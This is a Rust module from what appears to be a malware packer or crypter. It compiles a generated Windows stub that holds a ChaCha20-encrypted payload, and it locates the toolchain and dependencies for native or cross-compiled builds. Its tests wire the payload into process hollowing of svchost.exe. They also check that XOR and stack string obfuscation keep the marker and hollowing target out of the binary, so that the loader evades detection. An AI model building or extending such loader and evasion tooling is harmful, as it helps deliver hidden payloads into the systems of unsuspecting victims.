//! Compilation of the generated stub with `rustc`.
//!
//! On Windows the stub is compiled natively: `rustc` targets the host and the
//! dependencies are read from `target/{debug,release}/deps/`. On Linux/WSL the
//! stub is cross-compiled to `x86_64-pc-windows-gnu`: the dependencies come from
//! `target/x86_64-pc-windows-gnu/{debug,release}/deps/`, the host `deps` dir
//! provides the `windows-rs` proc-macros, and the GNU import library is passed
//! via `-L native`.
//!
//! Note: we do not use `-C lto=fat` because the `.rlib` files produced by
//! cargo do not carry bitcode (`.llvmbc`), so `lto=fat` with `--extern` fails.
//! We keep `-O` for optimizing the stub itself.

use std::ffi::OsStr;
use std::path::{Path, PathBuf};
use std::process::Command;

use super::{BuildError, Result};

/// `rustc` executable names (Windows and Unix).
const RUSTC_NAMES: &[&str] = &["rustc.exe", "rustc"];

/// Cross-compilation target used when the packer runs on a non-Windows host.
const STUB_TARGET: &str = "x86_64-pc-windows-gnu";

/// The `MZ` magic of a Windows PE (what the stub must be).
const PE_MAGIC: [u8; 2] = *b"MZ";

/// Whether the packer itself runs on Windows (the project's main mode).
const ON_WINDOWS: bool = cfg!(target_os = "windows");

/// Located dependencies required to compile the stub.
#[derive(Debug, Clone)]
pub struct StubDeps {
    /// `deps` directory holding the stub's target `.rlib` files.
    pub deps_dir: PathBuf,
    /// Host `deps` directory (holds the `windows-rs` proc-macros when
    /// cross-compiling). On Windows this is the same directory as `deps_dir`.
    pub host_deps_dir: PathBuf,
    /// `.rlib` of `chacha20poly1305`.
    pub chacha_rlib: PathBuf,
    /// `.rlib` of `hex`.
    pub hex_rlib: PathBuf,
    /// `.rlib` of `windows`.
    pub windows_rlib: PathBuf,
    /// `.rlib` of `thiserror` (used by techniques with typed errors).
    pub thiserror_rlib: PathBuf,
    /// Directory with the Windows native import lib (for `-L native=...`).
    pub windows_import_lib_dir: PathBuf,
}

/// Locates `rustc` in the system PATH.
pub fn find_rustc() -> Result<PathBuf> {
    let path = std::env::var_os("PATH").ok_or_else(|| {
        BuildError::RustcNotFound("the PATH environment variable is not set".to_string())
    })?;
    find_rustc_in(&path)
}

/// Searches for `rustc` in a `PATH`-formatted string.
fn find_rustc_in(path_entries: &OsStr) -> Result<PathBuf> {
    find_executable_in_path(path_entries, RUSTC_NAMES)
        .ok_or_else(|| BuildError::RustcNotFound("'rustc' was not found in PATH".to_string()))
}

/// Searches for an executable (from `names`) in the directories of `path_entries`.
fn find_executable_in_path(path_entries: &OsStr, names: &[&str]) -> Option<PathBuf> {
    for dir in std::env::split_paths(path_entries) {
        for name in names {
            let candidate = dir.join(name);
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

/// Locates every dependency required to compile the stub.
pub fn locate_stub_deps() -> Result<StubDeps> {
    if ON_WINDOWS {
        // Native build: the rlibs live in the host's `deps` directory.
        let deps_dir = find_deps_dir_in(&target_dir())?;
        Ok(StubDeps {
            chacha_rlib: find_rlib(&deps_dir, "chacha20poly1305")?,
            hex_rlib: find_rlib(&deps_dir, "hex")?,
            windows_rlib: find_rlib(&deps_dir, "windows")?,
            thiserror_rlib: find_rlib(&deps_dir, "thiserror")?,
            windows_import_lib_dir: find_windows_import_lib_dir()?,
            host_deps_dir: deps_dir.clone(),
            deps_dir,
        })
    } else {
        // Cross-compile from Linux/WSL: target rlibs live under the cross
        // target's `deps` directory, and the host `deps` directory provides the
        // `windows-rs` proc-macros.
        let deps_dir = find_cross_deps_dir()?;
        let host_deps_dir = find_host_deps_dir()?;
        Ok(StubDeps {
            chacha_rlib: find_rlib(&deps_dir, "chacha20poly1305")?,
            hex_rlib: find_rlib(&deps_dir, "hex")?,
            windows_rlib: find_rlib(&deps_dir, "windows")?,
            thiserror_rlib: find_rlib(&deps_dir, "thiserror")?,
            windows_import_lib_dir: find_windows_import_lib_dir()?,
            deps_dir,
            host_deps_dir,
        })
    }
}

/// Determines the `target/` directory of the workspace.
fn target_dir() -> PathBuf {
    if let Some(dir) = std::env::var_os("CARGO_TARGET_DIR") {
        return PathBuf::from(dir);
    }
    Path::new(env!("CARGO_MANIFEST_DIR")).join("target")
}

/// Finds the host's `deps` directory (`target/{debug,release}/deps`).
fn find_host_deps_dir() -> Result<PathBuf> {
    for profile in ["debug", "release"] {
        let deps = target_dir().join(profile).join("deps");
        if deps.is_dir() {
            return Ok(deps);
        }
    }
    Err(BuildError::RlibNotFound {
        crate_name: "host".to_string(),
        detail: "no 'target/{debug,release}/deps' directory was found".to_string(),
    })
}

/// Finds the cross-target's `deps` directory
/// (`target/x86_64-pc-windows-gnu/{debug,release}/deps`), reporting a clear
/// error when the cross-compilation target has not been installed.
fn find_cross_deps_dir() -> Result<PathBuf> {
    let triple_dir = target_dir().join(STUB_TARGET);
    if !triple_dir.is_dir() {
        return Err(BuildError::MissingCrossTarget);
    }
    find_deps_dir_in(&triple_dir)
}

/// Finds the `deps` directory holding the three `.rlib` files under
/// `{debug,release}/deps` of the given `target`.
fn find_deps_dir_in(target: &Path) -> Result<PathBuf> {
    for profile in ["debug", "release"] {
        let deps = target.join(profile).join("deps");
        if deps.is_dir()
            && find_rlib(&deps, "chacha20poly1305").is_ok()
            && find_rlib(&deps, "hex").is_ok()
            && find_rlib(&deps, "windows").is_ok()
        {
            return Ok(deps);
        }
    }
    Err(BuildError::RlibNotFound {
        crate_name: "chacha20poly1305/hex/windows".to_string(),
        detail: format!(
            "no '{{debug,release}}/deps' directory with the .rlib files was found under '{}'",
            target.display()
        ),
    })
}

/// Finds the `.rlib` of a crate in `deps_dir`.
///
/// If there are several `.rlib` files with the same crate name (e.g. compiled
/// with different feature sets), the most recent one is chosen: that is the one
/// cargo just wrote with the current features, avoiding a stale artifact that
/// would cause "item configured out" errors.
fn find_rlib(deps_dir: &Path, crate_name: &str) -> Result<PathBuf> {
    use std::time::SystemTime;

    let prefix = format!("lib{crate_name}-");
    let entries = std::fs::read_dir(deps_dir).map_err(|e| BuildError::RlibNotFound {
        crate_name: crate_name.to_string(),
        detail: e.to_string(),
    })?;

    let mut candidates: Vec<(SystemTime, PathBuf)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name.starts_with(&prefix) && name.ends_with(".rlib") {
            let modified = entry
                .metadata()
                .and_then(|m| m.modified())
                .unwrap_or(SystemTime::UNIX_EPOCH);
            candidates.push((modified, entry.path()));
        }
    }

    candidates.sort_by_key(|c| std::cmp::Reverse(c.0));
    candidates
        .into_iter()
        .next()
        .map(|(_, path)| path)
        .ok_or_else(|| BuildError::RlibNotFound {
            crate_name: crate_name.to_string(),
            detail: format!("no '{prefix}*.rlib' was found in '{}'", deps_dir.display()),
        })
}

/// Locates the directory with the Windows native import lib.
///
/// `windows` links via `raw-dylib` against an import library provided by the
/// `windows_x86_64_*` crate: `windows_x86_64_msvc` on Windows and
/// `windows_x86_64_gnu` when cross-compiling from Linux. The version is read
/// from `Cargo.lock` so it matches exactly the one `windows` uses.
fn find_windows_import_lib_dir() -> Result<PathBuf> {
    let crate_name = if ON_WINDOWS {
        "windows_x86_64_msvc"
    } else {
        "windows_x86_64_gnu"
    };
    let version = windows_crate_version(crate_name)?;
    let crate_dir_name = format!("{crate_name}-{version}");

    for index_dir in registry_src_dirs()? {
        let lib_dir = index_dir.join(&crate_dir_name).join("lib");
        if lib_dir.is_dir() {
            return Ok(lib_dir);
        }
    }

    Err(BuildError::WindowsImportLibNotFound(format!(
        "'{crate_dir_name}/lib' was not found in Cargo's registry"
    )))
}

/// Returns the `$CARGO_HOME/registry/src/*` directories (crate indexes).
fn registry_src_dirs() -> Result<Vec<PathBuf>> {
    let src = cargo_home()?.join("registry").join("src");
    let entries = std::fs::read_dir(&src).map_err(|e| {
        BuildError::WindowsImportLibNotFound(format!("could not read '{}': {e}", src.display()))
    })?;

    let mut dirs = Vec::new();
    for entry in entries.flatten() {
        if entry.path().is_dir() {
            dirs.push(entry.path());
        }
    }

    if dirs.is_empty() {
        return Err(BuildError::WindowsImportLibNotFound(format!(
            "there are no crate indexes in '{}'",
            src.display()
        )));
    }
    Ok(dirs)
}

/// Determines the `CARGO_HOME` directory (defaults to `~/.cargo`).
fn cargo_home() -> Result<PathBuf> {
    if let Some(dir) = std::env::var_os("CARGO_HOME") {
        return Ok(PathBuf::from(dir));
    }
    // We avoid `std::env::home_dir()` (deprecated). On Windows we use USERPROFILE.
    if let Some(dir) = std::env::var_os("USERPROFILE") {
        return Ok(PathBuf::from(dir).join(".cargo"));
    }
    if let Some(dir) = std::env::var_os("HOME") {
        return Ok(PathBuf::from(dir).join(".cargo"));
    }
    Err(BuildError::WindowsImportLibNotFound(
        "could not determine CARGO_HOME".to_string(),
    ))
}

/// Reads the resolved version of a `windows_x86_64_*` crate from `Cargo.lock`.
fn windows_crate_version(crate_name: &str) -> Result<String> {
    let lock_path = Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.lock");
    let content = std::fs::read_to_string(&lock_path).map_err(|e| {
        BuildError::WindowsImportLibNotFound(format!(
            "could not read '{}': {e}",
            lock_path.display()
        ))
    })?;

    let name_marker = format!("name = \"{crate_name}\"");
    let start = content.find(&name_marker).ok_or_else(|| {
        BuildError::WindowsImportLibNotFound(format!("'{crate_name}' was not found in Cargo.lock"))
    })?;
    let rest = &content[start + name_marker.len()..];

    let ver_marker = "version = \"";
    let vstart = rest.find(ver_marker).ok_or_else(|| {
        BuildError::WindowsImportLibNotFound(format!(
            "could not read the '{crate_name}' version from Cargo.lock"
        ))
    })? + ver_marker.len();
    let vend = rest[vstart..].find('"').ok_or_else(|| {
        BuildError::WindowsImportLibNotFound(format!(
            "malformed '{crate_name}' version in Cargo.lock"
        ))
    })? + vstart;

    Ok(rest[vstart..vend].to_string())
}

/// Compiles the generated stub into a final binary.
pub fn compile_stub(stub_rs: &Path, output: &Path, deps: &StubDeps) -> Result<()> {
    let rustc = find_rustc()?;

    let mut cmd = Command::new(rustc);
    if !ON_WINDOWS {
        cmd.arg("--target").arg(STUB_TARGET);
    }
    cmd.arg(stub_rs)
        .arg("--edition")
        .arg("2021")
        .arg("-O")
        .arg("-C")
        .arg("strip=symbols")
        .arg("-C")
        .arg("panic=abort")
        .arg("-C")
        .arg("codegen-units=1")
        .arg("-C")
        .arg("target-feature=+crt-static")
        .arg("-L")
        .arg(format!("dependency={}", deps.deps_dir.display()));
    if !ON_WINDOWS {
        cmd.arg("-L")
            .arg(format!("dependency={}", deps.host_deps_dir.display()));
    }
    cmd.arg("-L")
        .arg(format!("native={}", deps.windows_import_lib_dir.display()))
        .arg("--extern")
        .arg(format!("chacha20poly1305={}", deps.chacha_rlib.display()))
        .arg("--extern")
        .arg(format!("hex={}", deps.hex_rlib.display()))
        .arg("--extern")
        .arg(format!("windows={}", deps.windows_rlib.display()))
        .arg("--extern")
        .arg(format!("thiserror={}", deps.thiserror_rlib.display()))
        .arg("-o")
        .arg(output);

    let out = cmd
        .output()
        .map_err(|e| BuildError::CompilationFailed(format!("could not invoke rustc: {e}")))?;

    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(BuildError::CompilationFailed(stderr.to_string()));
    }

    verify_pe_magic(output)
}

/// Verifies that the compiled stub is a Windows PE (`MZ` magic).
///
/// A missing `--target` (or a wrong target) silently produces an ELF, so this
/// sanity check catches those failures early and reports the output path.
fn verify_pe_magic(path: &Path) -> Result<()> {
    use std::io::Read;

    let mut magic = [0u8; 2];
    std::fs::File::open(path)
        .and_then(|mut f| f.read_exact(&mut magic))
        .map_err(|e| {
            BuildError::NotPeExecutable(format!("could not read '{}': {e}", path.display()))
        })?;

    if magic != PE_MAGIC {
        return Err(BuildError::NotPeExecutable(path.display().to_string()));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn find_executable_in_empty_path_is_none() {
        assert!(find_executable_in_path(OsStr::new(""), RUSTC_NAMES).is_none());
    }

    #[test]
    fn rustc_missing_produces_clear_error() {
        let err = find_rustc_in(OsStr::new("")).expect_err("an empty PATH should fail");
        let msg = err.to_string();
        assert!(msg.contains("rustc"), "unclear error message: {msg}");
    }

    /// `find_deps_dir_in` must locate `debug/deps` when the three rlibs are
    /// present under a given target directory.
    #[test]
    fn finds_deps_dir_under_debug() {
        let tmp = std::env::temp_dir().join(format!("packerman_deps_{}", std::process::id()));
        let deps = tmp.join("debug").join("deps");
        std::fs::create_dir_all(&deps).unwrap();
        for crate_name in ["chacha20poly1305", "hex", "windows"] {
            std::fs::write(deps.join(format!("lib{crate_name}-deadbeef.rlib")), b"").unwrap();
        }

        let found = find_deps_dir_in(&tmp).expect("should locate debug/deps");
        assert!(found.ends_with("debug/deps"));

        let _ = std::fs::remove_dir_all(&tmp);
    }

    /// Full packing flow with a 1 KB payload.
    ///
    /// Marked `#[ignore]` because it requires `rustc` and the already-compiled
    /// dependencies. On Windows that is `cargo build`; on Linux/WSL it also
    /// requires `cargo build --target x86_64-pc-windows-gnu`. Run it with:
    /// `cargo test -- --ignored`.
    #[test]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn full_pipeline_generates_exe() {
        let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
        let key = crate::engine::crypto::generate_key();
        let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();

        let build_dir = std::env::temp_dir().join(format!("packerman_it_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&build_dir);
        std::fs::create_dir_all(&build_dir).unwrap();

        std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

        let tpl_path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("templates")
            .join("stub")
            .join("main.rs.tpl");
        let template = std::fs::read_to_string(tpl_path).unwrap();
        let params = crate::engine::stub::StubParams {
            nonce_hex: hex::encode(encrypted.nonce),
            key_hex: hex::encode(encrypted.key),
            plaintext_len: encrypted.plaintext_len,
            stub_marker: crate::engine::stub::generate_stub_marker(),
            payload_path: "payload.bin".to_string(),
        };
        let pipeline = vec![crate::techniques::PipelineStep::ProcessHollowing(
            crate::techniques::process_hollowing::Params {
                target: r"C:\Windows\System32\svchost.exe".to_string(),
            },
        )];
        let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
        let stub_src =
            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings).unwrap();
        let stub_path = build_dir.join("main.rs");
        std::fs::write(&stub_path, stub_src).unwrap();

        let deps = locate_stub_deps().unwrap();
        let out = build_dir.join("out.exe");
        compile_stub(&stub_path, &out, &deps).unwrap();

        let meta = std::fs::metadata(&out).unwrap();
        assert!(
            meta.len() > 0,
            "out.exe must exist and be larger than 0 bytes"
        );

        let _ = std::fs::remove_dir_all(&build_dir);
    }

    /// Compiles the stub with each string-obfuscation strategy and checks that
    /// the sensitive literals (marker and hollowing target) never appear in
    /// cleartext in the resulting PE.
    ///
    /// This is the real end-to-end validation of the feature. Marked
    /// `#[ignore]` for the same reasons as `full_pipeline_generates_exe`.
    #[test]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn obfuscated_strings_absent_from_binary() {
        use crate::engine::obfuscation::{StringStrategy, StringsConfig};

        let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
        let key = crate::engine::crypto::generate_key();
        let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();

        let build_dir = std::env::temp_dir().join(format!("packerman_str_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&build_dir);
        std::fs::create_dir_all(&build_dir).unwrap();
        std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

        let template = std::fs::read_to_string(
            Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("templates")
                .join("stub")
                .join("main.rs.tpl"),
        )
        .unwrap();

        let deps = locate_stub_deps().unwrap();

        let marker = "STUB_MARKER_test00000000".to_string();
        let target = r"C:\Windows\System32\svchost.exe".to_string();

        let strategies = [
            (
                "xor",
                StringsConfig {
                    strategy: StringStrategy::Xor,
                    key: Some([0x5Au8; 32]),
                },
            ),
            (
                "stack",
                StringsConfig {
                    strategy: StringStrategy::Stack,
                    key: None,
                },
            ),
        ];

        for (name, strings) in strategies {
            let params = crate::engine::stub::StubParams {
                nonce_hex: hex::encode(encrypted.nonce),
                key_hex: hex::encode(encrypted.key),
                plaintext_len: encrypted.plaintext_len,
                stub_marker: marker.clone(),
                payload_path: "payload.bin".to_string(),
            };
            let pipeline = vec![crate::techniques::PipelineStep::ProcessHollowing(
                crate::techniques::process_hollowing::Params {
                    target: target.clone(),
                },
            )];
            let stub_src =
                crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings)
                    .unwrap();
            let stub_path = build_dir.join(format!("main_{name}.rs"));
            std::fs::write(&stub_path, stub_src).unwrap();

            let out = build_dir.join(format!("out_{name}.exe"));
            compile_stub(&stub_path, &out, &deps).unwrap();

            let binary = std::fs::read(&out).unwrap();
            assert!(
                !binary.windows(marker.len()).any(|w| w == marker.as_bytes()),
                "{name}: marker leaked into the binary"
            );
            assert!(
                !binary.windows(target.len()).any(|w| w == target.as_bytes()),
                "{name}: hollowing target leaked into the binary"
            );
        }

        let _ = std::fs::remove_dir_all(&build_dir);
    }
}
